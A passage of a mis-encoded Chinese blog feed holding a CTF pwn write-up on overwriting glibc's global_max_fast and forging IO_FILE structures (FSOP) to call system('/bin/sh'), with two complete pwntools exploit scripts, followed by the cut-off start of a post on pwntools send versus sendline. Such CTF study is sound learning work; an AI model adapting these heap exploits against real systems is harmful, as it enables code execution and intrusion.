title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>å¾ˆæ˜æ˜¾ <code>0xdeadbeef</code> æœ¬èº«æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œå› æ­¤è€ƒè™‘è¿™é‡Œæ˜¯è®©æˆ‘ä»¬æ”¹å¤§æŸå¤„åœ°å€é‡Œå­˜æ”¾çš„æ•°æ®ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯æ›´æ”¹ <code>global max fast</code> ä¸º <code>0xdeadbeef</code> ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä»»æ„ä¸€ä¸ª <code>libc</code> åœ°å€é‡Œå†™å…¥ä¸€ä¸ª <code>heap</code> åœ°å€ã€‚è€Œæ­¤å¤„æ¯”èµ›çš„æ—¶å€™æƒ³åˆ°çš„æ”»å‡»æ˜¯åŠ«æŒ <code>vtable</code> æˆ–è€…åŠ«æŒ <code>IO_FILE</code> ï¼Œä¸è¿‡æƒ³äº†ä¸€ä¼šå‘ç°è¿˜æ˜¯åªèƒ½åŠ«æŒ <code>IO_FILE</code> ï¼ˆåº”è¯¥æ˜¯æ²¡æ³•æ§åˆ¶ <code>flags</code> å­—æ®µçš„ï¼‰</p><p>ç„¶åæ‰“ <code>FSOP</code> ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ€è·¯ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä¼ªé€ ä¸¤æ¬¡ <code>IO_FILE</code> ï¼Œè®©ç¬¬ä¸€ä¸ªä¼ªé€ çš„ <code>IO_FILE</code> çš„<code>_chain</code> å­—æ®µæŒ‡å‘ç¬¬äºŒä¸ª <code>IO_FILE</code> ï¼Œå› ä¸ºå½“æ—¶è€ƒè™‘çš„æ˜¯ç¬¬ä¸€ä¸ª <code>IO_FILE</code> çš„ <code>flags</code> å­—æ®µæ²¡æ³•æ§åˆ¶ï¼Œäºæ˜¯è¿˜å¾—å†ä¼ªé€ ä¸€ä¸ª <code>IO_FILE</code> ï¼ˆä½†äº‹å®æ˜¯ï¼Œè¿™é‡Œçš„ <code> flags</code>å¯ä»¥æ§åˆ¶çš„ï¼‰</p><h4 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h4><p>è¿™é‡Œè¯´ä¸€ä¸‹ä¼ªé€ ä¸¤ä¸ª <code>IO_FILE</code> éœ€è¦ä¼ªé€ çš„å­—æ®µã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬ä¸€ä¸ªç»“æ„ä½“ä¸­ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›æ‰§è¡Œ <code>_IO_OVERFLOW</code> å› æ­¤ï¼Œè¦è®©å‰é¢çš„æ£€æŸ¥ä¸é€šè¿‡ã€‚è€Œå‰é¢çš„æ¡ä»¶åˆç”±ä¸€ä¸ª <code>||</code> è¿æ¥ï¼Œå› æ­¤éœ€è¦ç¬¬ä¸€ä¸ªæ¡ä»¶å’Œç¬¬äºŒä¸ªæ¡ä»¶å…¨éƒ¨ä¸æˆç«‹æ‰å¯ä»¥ã€‚</p><p>è¿™é‡Œä¼ªé€ çš„å­—æ®µä¸º <code>fp-&gt;_mode == 0</code> <code>fp-&gt;_IO_write_ptr== fp-&gt;_IO_write_base==0</code></p><p>è¿™æ ·å‰åä¸¤ä¸ªæ¡ä»¶å…¨éƒ¨æ— æ³•æˆç«‹ï¼Œè‡ªç„¶æ— æ³•è°ƒç”¨ <code>_IO_OVERFLOW</code> </p><p>åœ¨ä¼ªé€ å­—æ®µç»•è¿‡ <code>if</code> çš„åŒæ—¶ï¼Œä¸è¦å¿˜è®°è®¾ç½®å¥½ <code>_chain</code> å­—æ®µï¼Œè®©å…¶æŒ‡å‘ç¬¬äºŒä¸ªç»“æ„ä½“ã€‚</p><p>åœ¨ç¬¬äºŒä¸ªç»“æ„ä½“ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ <code>_IO_OVERFLOW</code>  ï¼Œå› æ­¤è¦å°† <code>fp-&gt;_mode == 0</code> <code>fp-&gt;_IO_write_ptr ==1</code> <code>fp-&gt;_IO_write_base == 0</code> ,è¿™æ ·å³å¯è§¦å‘ <code>_IO_OVERFLOW</code> ã€‚åœ¨è¿™ä¹‹å‰åªéœ€è¦ä¼ªé€ å¥½ç¬¬äºŒä¸ªç»“æ„ä½“çš„ <code>flags</code> å­—æ®µå’Œ <code>vtable</code> ä¸­çš„ <code>overflow</code> è®©å…¶æŒ‡å‘ <code>system</code> çš„åœ°å€å³å¯è·å– <code>shell</code></p><h4 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h4><p>ç¬¬äºŒä¸ªæ–¹æ³•å°±æ˜¯åªä¼ªé€ ç¬¬ä¸€ä¸ªç»“æ„ä½“ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶ <code>vtable</code> çš„ï¼Œè€Œä½œä¸ºå‚æ•°çš„ <code>flags</code> å­—æ®µä½äºå †å—çš„ <code>prev_size</code> ä¸Šï¼Œåœ¨ä¸Šä¸€ä¸ªå †å—å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œ <code>prev_size</code> æ˜¯ä½œä¸ºä¸Šä¸€ä¸ªå †å—çš„ç”¨æˆ·åŒºåŸŸï¼Œæ‰€ä»¥è¿™ä¸ªå­—æ®µä¹Ÿæ˜¯å¯æ§çš„ï¼Œåªéœ€è¦è®©ä¸Šä¸€ä¸ªå †å—ç”³è¯·ä¸º <code>size</code> ä»¥ <code>8</code> ç»“å°¾çš„å³å¯ã€‚æœ€åç”¨ <code>/bin/sh\x00</code> å¡«æ»¡å †å—ï¼Œä»è€Œæ§åˆ¶äº†ç»“æ„ä½“ä¸­çš„ <code>flags</code> å­—æ®µã€‚åˆ«å¿˜è®°ä¼ªé€ å­—æ®µæ¥è§¦å‘ <code>_IO_OVERFLOW</code></p><p>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹ç¯¡æ”¹<code>  global_max_fast</code> ï¼Œæœ€ç»ˆæ•ˆæœæ˜¯å¯ä»¥åœ¨ä¸€ä¸ªé«˜äº <code>fastbinY</code> çš„åœ°å€å¤„å†™ä¸€ä¸ªå †åœ°å€ï¼ˆè¿™ä¸ªçš„æ”»å‡»æœ¬è´¨å°±æ˜¯æ•°ç»„æº¢å‡ºï¼Œåç»­åˆ©ç”¨é€šå¸¸æ˜¯æ”»å‡»IOï¼‰ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶æ˜¯å¯¹ç”³è¯·çš„å †å—çš„ <code>size</code> ä¸èƒ½é™åˆ¶çš„å¤ªå°ï¼Œå¦‚æœç´¢å¼•å¤ªå°çš„è¯æ— æ³•ä¿®æ”¹åˆ°æˆ‘ä»¬æœŸæœ›çš„ç›®çš„åœ°å€ã€‚ç„¶ååˆ©ç”¨è¿‡ç¨‹æ˜¯å…ˆç”³è¯·ä¸€ä¸ªç²¾å¿ƒæ„é€ å¥½ <code>size</code> çš„å †å—ï¼Œæ¥ç€ç¯¡æ”¹ <code>global_max_fast</code> ï¼ˆè¿™é‡Œé¡ºåºä¸è¦å¼„åï¼‰ï¼Œå†å°†åˆšåˆšç”³è¯·çš„å †å—é‡Šæ”¾ï¼Œå³å¯è§¦å‘æ”»å‡»ï¼Œå‘ä¸€ä¸ª <code>libc</code> åœ°å€ä¸­å†™å…¥åˆšåˆšç”³è¯·çš„å †åœ°å€ã€‚</p><p>è¯¥æ‰‹æ³•åˆ©ç”¨çš„å…³é”®åœ¨äº <code>size</code> å¦‚ä½•è®¡ç®—  å…·ä½“çš„è¯è¯·å‚è€ƒ æˆ‘çš„è¿™ç¯‡<a href="https://zikh26.github.io/posts/30a1c326.html#%E7%AF%A1%E6%94%B9global-max-fast">æ–‡ç« </a> </p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>è¿™é‡Œä¿©expéƒ½æ”¾ä¸€ä¸‹å§,æ•´ä½“æ€è·¯éƒ½å·®ä¸å¤šå…¶å®ã€‚ä¸‹é¢è¿™ä¸ªæ˜¯ä¼ªé€ ä¸€ä¸ªç»“æ„ä½“çš„exp</p><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xDC1</span></span><br><span class="line">d_d=<span class="number">0xdd9</span></span><br><span class="line">d_e=<span class="number">0xDCD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content length:\n&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;ontent:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Comment:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content id:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#leak libc address</span></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1008</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="built_in">int</span>(<span class="number">0x1008</span>/<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x100</span>,p64(<span class="number">0xdeadbeefdeadbeef</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#leak heap address</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fastbin_ptr=libc_base+<span class="number">0x3c4b28</span></span><br><span class="line">global_max_fast=libc_base+<span class="number">0x3c67f8</span></span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">chain=libc_base+<span class="number">0x3c5688</span></span><br><span class="line">vtable_addr=libc_base+<span class="number">0x3c56f8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">index=(chain-<span class="number">8</span>-fastbin_ptr)/<span class="number">8</span></span><br><span class="line">size=index*<span class="number">0x10</span>+<span class="number">0x20</span></span><br><span class="line">log_info(<span class="built_in">hex</span>(<span class="built_in">int</span>(size)))</span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(size),p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(heap_addr+<span class="number">0x1710</span>)+p64 (sys_addr)*<span class="number">4</span>)<span class="comment">#ä¼ªé€ çš„ç»“æ„ä½“</span></span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(global_max_fast))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xCF1</span>,<span class="number">0xDE5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¿™ä¸ªexpæ˜¯ä¿©ç»“æ„ä½“çš„ï¼Œæ¯”èµ›çš„æ—¶å€™å†™çš„æ˜¯è¿™ä¸ªï¼Œä»£ç æ¯”è¾ƒçƒ‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xDC1</span></span><br><span class="line">d_d=<span class="number">0xdd9</span></span><br><span class="line">d_e=<span class="number">0xDCD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content length:\n&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;ontent:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Comment:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content id:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,p64(<span class="number">0xdeadbeefdeadbeef</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">fastbin_ptr=libc_base+<span class="number">0x3c4b28</span></span><br><span class="line">global_max_fast=libc_base+<span class="number">0x3c67f8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=heap_addr+<span class="number">0x620</span>+<span class="number">0x10</span>+<span class="number">0xe0</span></span><br><span class="line">file._IO_write_ptr=<span class="number">1</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="built_in">bytes</span>(file)+p64(sys_addr)*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">chain=libc_base+<span class="number">0x3c5688</span></span><br><span class="line">vtable_addr=libc_base+<span class="number">0x3c56f8</span></span><br><span class="line">index=(chain-<span class="number">8</span>-fastbin_ptr)/<span class="number">8</span></span><br><span class="line">size=index*<span class="number">0x10</span>+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(size),p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(heap_addr+<span class="number">0x620</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">10</span>+p32(<span class="number">0</span>))</span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(global_max_fast))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xCF1</span>,<span class="number">0xDE5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ¯”èµ›ç»“æŸï¼Œç¯å¢ƒç›´æ¥å…³é—­äº†ï¼Œä¹Ÿæ²¡æ³•æ‰“è¿œç¨‹ï¼Œå°±è‡ªå·±æ‰“äº†ä¸‹æœ¬åœ°ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102111363.png" alt="image-20230110211123791"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> global_max_fast </tag>
            
            <tag> FSOP </tag>
            
            <tag> ä¼ªé€ IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¢ç©¶pwntoolsä¸­sendlineçš„å›è½¦æ‰€é€ æˆçš„å½±å“ï¼ˆä»€ä¹ˆæ—¶å€™ç”¨sendlineï¼Œä»€ä¹ˆæ—¶å€™ç”¨sendï¼‰</title>
      <link href="/posts/9fda4edb.html"/>
      <url>/posts/9fda4edb.html</url>
      
        <content type="html"><![CDATA[<p>åœ¨pwntoolsä¸­ï¼Œsendlineå’Œsendéƒ½æ˜¯å‘é€æ•°æ®ï¼Œä½†æ˜¯sendlineæ˜¯å‘é€ä¸€è¡Œæ•°æ®ï¼Œæ¢å¥è¯è¯´å°±æ˜¯sendlineä¼šåœ¨å‘é€çš„æ•°æ®æœ«å°¾åŠ ä¸€ä¸ªå›è½¦ã€‚è€Œ<strong>è¿™ä¸ªå›è½¦æ‰€é€ æˆçš„å½±å“ï¼Œæ˜¯è·Ÿå¯¹åº”çš„è¾“å…¥å‡½æ•°æœ‰å…³ç³»</strong>ï¼Œåœ¨åšpwné¢˜ä¸­ï¼Œç¢°è§çš„è¾“å…¥å‡½æ•°æœ‰scanfï¼ˆâ€%sâ€)ï¼Œgets()ï¼Œread()ï¼Œfgets(),è¿™å››ä¸ªå‡½æ•°ã€‚æˆ‘æ„Ÿè§‰æœ€å¸¸è§çš„åº”è¯¥æ˜¯readå‡½æ•°ã€‚<strong>æˆ‘ä»¬åˆ†åˆ«è®¨è®ºä¸€ä¸‹è¿™å‰ä¸‰ä¸ªå‡½æ•°åœ¨è¯»å–å†…å®¹ä¸Šçš„å…·ä½“ç»†èŠ‚ä»¥åŠsendlineæ‰€é€ æˆçš„å½±å“</strong>ã€‚</p><h1 id="readå‡½æ•°"><a href="#readå‡½æ•°" class="headerlink" title="readå‡½æ•°"></a>readå‡½æ•°</h1><p><u>read(fd, buf,  count) fdæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä½ å¯ä»¥é€šä¿—ç†è§£ä¸ºä»å“ªè¯»ï¼›bufæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä½ å¯ä»¥ç†è§£ä¸ºè¯»åˆ°å“ªï¼Œcountå°±æ˜¯è¯»å…¥å­—ç¬¦çš„æ•°é‡ã€‚</u></p><p><font color=red><em><strong>readçš„å†…å®¹éƒ½æ˜¯ä»ç¼“å†²åŒºä¸­è¯»å–çš„</strong></em></font><br>å¦‚æœreadçš„fdæ˜¯0ï¼Œä¹Ÿå°±æ˜¯è¯´readçš„å†…å®¹ï¼Œéƒ½è¦ä»è¾“å…¥çš„ç¼“å†²åŒºä¸­è¯»å–ã€‚ï¼ˆ0åœ¨æ–‡ä»¶æè¿°ç¬¦ä¸­ä»£è¡¨ç€æ ‡å‡†è¾“å…¥ï¼‰è¿™é‡Œè¦æ³¨æ„ï¼Œ<strong>è¯»å–çš„å†…å®¹ä¸æ˜¯ç›´æ¥è¢«è¾“å…¥åˆ°äº†æŒ‡å®šçš„åœ°æ–¹ï¼Œè€Œæ˜¯ä¸ç®¡ä½ è¾“å…¥äº†å¤šå°‘å†…å®¹ï¼Œå³ä½¿è¶…è¿‡äº†countçš„é™åˆ¶ï¼Œ</strong><font color=red><strong>ä¹Ÿä¾æ—§è¾“å…¥åˆ°äº†è¾“å…¥ç¼“å†²åŒºä¸­</strong></font><br>åªæ˜¯readå‡½æ•°æ²¡æœ‰æŠŠè¾“å…¥ç¼“å†²åŒºä¸­è¶…è¿‡counté™åˆ¶çš„åé¢çš„å†…å®¹è¯»åˆ°æŒ‡å®šçš„bufè€Œå·²ï¼Œ<strong>ä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶è¾“å…¥ç¼“å†²åŒºé‡Œé¢ä¾ç„¶å­˜åœ¨å¤šä½™çš„å†…å®¹ã€‚</strong>åŒæ ·ï¼Œ<font color=red><em>ä¹Ÿå°±æ˜¯è¯´å¦‚æœä½ è¾“å…¥çš„å†…å®¹æ˜¯ä¼´éšç€ä½ æŒ‰ä¸‹å›è½¦ç»“æŸï¼Œå¹¶ä¸”æ­¤æ—¶è¾“å…¥å†…å®¹çš„é•¿åº¦è¿˜å°äºreadå‡½æ•°çš„counté‚£ä¹ˆè¿™ä¸ªå›è½¦ä¹Ÿä¼šè¢«è¯»å–åˆ°readæŒ‡å®šçš„ç¬¬äºŒä¸ªå‚æ•°ä¸­</em></font></p><p>æˆ‘ä»¬ç°åœ¨æ¥åˆ†æƒ…å†µè®¨è®ºreadï¼Œå®ƒåªæœ‰ä¸‰ç§å¯èƒ½<br>ç¬¬ä¸€ç§æƒ…å†µï¼Œ<em>readçš„ç¬¬ä¸‰ä¸ªå‚æ•°å¤§äºäº†å®é™…è¾“å…¥çš„å†…å®¹çš„å­—èŠ‚æ•°</em><br>é‚£ä¹ˆæ­¤æ—¶ï¼Œ<strong>è¾“å…¥åˆ°ç¼“å†²åŒºçš„å†…å®¹éƒ½è¢«è¯»å–åˆ°äº†readç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šçš„åœ°å€</strong>ï¼Œè¿™é‡Œå°±è¦æ³¨æ„ï¼Œæˆ‘ä»¬ç”¨sendlineå‘é€æ˜¯æ•°æ®å°±ç›¸å½“äºåœ¨åŸæœ¬çš„å‘é€çš„æ•°æ®ç»“å°¾å†åŠ ä¸Šä¸€ä¸ªå›è½¦ã€‚åœ¨pwné¢˜ä¸­ï¼Œå¤§å¤šæ—¶å€™readç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šçš„åœ°å€éƒ½æ˜¯å†™åˆ°äº†æ ˆé‡Œé¢<font color=red><em><strong>ä¹Ÿå°±æ˜¯è¯´ä¸ä»…ä»…readä¼šæŠŠä½ è¾“å…¥çš„æ•°æ®å­˜å…¥æ ˆä¸­ï¼Œè¿˜ä¼šæŠŠè¿™ä¸ªå›è½¦ï¼ˆASCIIç ä¹Ÿå°±æ˜¯0aï¼‰å­˜å…¥åˆ°æ ˆä¸­ï¼Œ</strong></em></font>å½“ç„¶ä½ å¯èƒ½å¤§éƒ¨åˆ†æ—¶å€™ï¼Œéƒ½ä¸ä¼šå¯¹é‚£ä¸ªå­˜å…¥0açš„å†…å­˜å•å…ƒè¿›è¡Œæ“ä½œï¼Œå› æ­¤æ˜¯ä¸å½±å“æˆ‘ä»¬è·å–shellçš„ä½†äº‹å®ä¸Šï¼Œæ­¤æ—¶çš„å›è½¦å·²ç»å½±å“åˆ°æ ˆä¸­æ•°æ®ï¼Œ<em><strong>æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨sendlineå¯èƒ½æ²¡æœ‰å› ä¸ºè¿™ä¸ªåŸå› å—åˆ°å½±å“ï¼Œä»…ä»…æ˜¯æˆ‘ä»¬æ²¡æœ‰ç”¨åˆ°é‚£ä¸ªè¢«0aå½±å“çš„æ•°æ®è€Œå·²</strong></em>ã€‚<u>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹é¢è¿™ä¸ªå›¾ç‰‡â‘ å¤„æ²¡æœ‰0a(å›è½¦)â‘¡å¤„æœ‰0aâ‘¢æ˜¯æ­£å¸¸çš„æ ˆç©ºé—´çš„å†…å®¹â‘£å¯ä»¥çœ‹åˆ°åŸæœ¬æ­£å¸¸çš„å†…å®¹ï¼Œå¯æœ€åçš„æœ«å°¾å´è¢«è¦†ç›–æˆ0aäº†</u>ã€‚æœ€å…³é”®çš„å°±æ˜¯åœ¨BUUCTFçš„pwnable_startè¿™é“é¢˜ï¼Œè¿™ä¸ªè¢«å¹²æ‰°çš„æ•°æ®ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä½¿ç”¨ï¼Œå› æ­¤åœ¨è¿™é‡Œé¢å¯¹readå‡½æ•°çš„æ—¶å€™ä¸å¯ä»¥ç”¨sendlineï¼Œåªèƒ½ä½¿ç”¨sendã€‚<br><img src="/../img/2706180-20220129192231393-1289193521.png"></p><p>ç¬¬äºŒæ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œç­‰äºäº†countçš„å­—èŠ‚ï¼ˆä¸åŒ…æ‹¬å›è½¦ï¼‰ã€‚<br>è¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬çš„æ•°æ®æ—¶å¯ä»¥æ­£å¸¸å­˜å…¥åˆ°æŒ‡å®šçš„åœ°å€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿æˆ‘ä»¬ä½¿ç”¨sendlineæ ˆä¸­ä¹Ÿå¹¶ä¸ä¼šå†™å…¥0aã€‚ä½†ï¼Œè¿™å°±å¯ä»¥é«˜æ•æ— å¿§äº†ä¹ˆï¼Ÿåˆ«å¿˜äº†ï¼Œ<strong>æˆ‘ä»¬è¾“å…¥çš„æ•°æ®å…ˆæ˜¯æ”¾å…¥äº†ç¼“å†²åŒºä¸­ï¼Œå†ä»ç¼“å†²åŒºä¸­å†™åˆ°äº†æŒ‡å®šçš„åœ°å€ï¼Œè™½ç„¶sendlineçš„å›è½¦æ²¡æœ‰è¢«å†™è¿›å»ï¼Œä½†æ˜¯å›è½¦åœç•™åœ¨äº†ç¼“å†²åŒºä¸­ã€‚</strong>æ¥ä¸‹æ¥å¦‚æœæœ‰getså‡½æ•°éœ€è¦è·å–è¾“å…¥çš„è¯ï¼Œ<font color=red><em><strong>getså‡½æ•°ä¼šå› 